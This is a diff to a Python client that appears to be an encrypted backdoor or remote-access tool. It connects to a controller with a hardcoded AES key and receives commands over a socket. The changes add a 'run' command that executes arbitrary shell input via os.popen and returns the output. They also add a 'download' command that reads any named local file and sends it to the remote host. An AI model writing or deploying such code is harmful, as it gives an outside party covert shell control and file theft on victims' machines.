@@ -16,7 +16,7 @@ KEY  = '82e672ae054aa4de6f042c888111686a'
 
 
 def pad(s):
-    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)
+    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)
 
 
 def encrypt(plaintext):
@@ -39,15 +39,32 @@ def main():
 
     while True:
         data = s.recv(1024)
-        cmd = decrypt(data)
+        data = decrypt(data).split()
+
+        # seperate data into command and action
+        cmd, action = data[0], ' '.join(data[1:])
+
+        # allow no action
+        if action == []:
+            action = ''
 
         # stop client
         if cmd == 'quit':
             s.close()
             sys.exit(0)
 
-        results = os.popen(cmd).read()
-        s.sendall(encrypt(results))
+        # run command
+        elif cmd == 'run':
+            results = os.popen(action).read()
+            s.sendall(encrypt(results))
+
+        # send file
+        elif cmd == 'download':
+            f_name = action.split()[0]
+            with open(f_name, 'rb') as f:
+                results = f.read(4096)
+                s.sendall(encrypt(results))
+            s.sendall('end of file')
 
 
 if __name__ == '__main__':
